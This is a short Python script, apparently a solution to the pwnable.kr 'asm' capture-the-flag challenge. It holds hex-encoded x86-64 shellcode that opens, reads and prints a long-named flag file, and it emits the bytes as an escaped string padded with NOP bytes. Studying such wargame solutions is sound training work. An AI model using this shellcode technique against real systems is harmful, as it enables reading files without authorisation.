payload="""eb 3a 5d 48 ff c0 48 ff c0 48 89 ef 48 31 f6 48
31 d2 0f 05 48 89 c7 48 31 c0 48 89 ee 48 31 c9
b1 e9 48 ff c5 e2 fb b2 ff 0f 05 48 31 ff 48 ff
c7 48 89 c2 48 31 c0 48 ff c0 0f 05 e8 c1 ff ff
ff 2e 2f 74 68 69 73 5f 69 73 5f 70 77 6e 61 62
6c 65 2e 6b 72 5f 66 6c 61 67 5f 66 69 6c 65 5f
70 6c 65 61 73 65 5f 72 65 61 64 5f 74 68 69 73
5f 66 69 6c 65 2e 73 6f 72 72 79 5f 74 68 65 5f
66 69 6c 65 5f 6e 61 6d 65 5f 69 73 5f 76 65 72
79 5f 6c 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 30
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 30
30 30 30 30 30 30 30 30 30 30 30 6f 30 6f 30 6f
30 6f 30 6f 30 6f 30 6f 6e 67 00 00 00 00 00 00"""
payload = payload.replace("\n"," ")
print(r"\\x" + r"\\x".join(payload.split(" "))+r"\\x" + r"\\x".join(["90"]*255))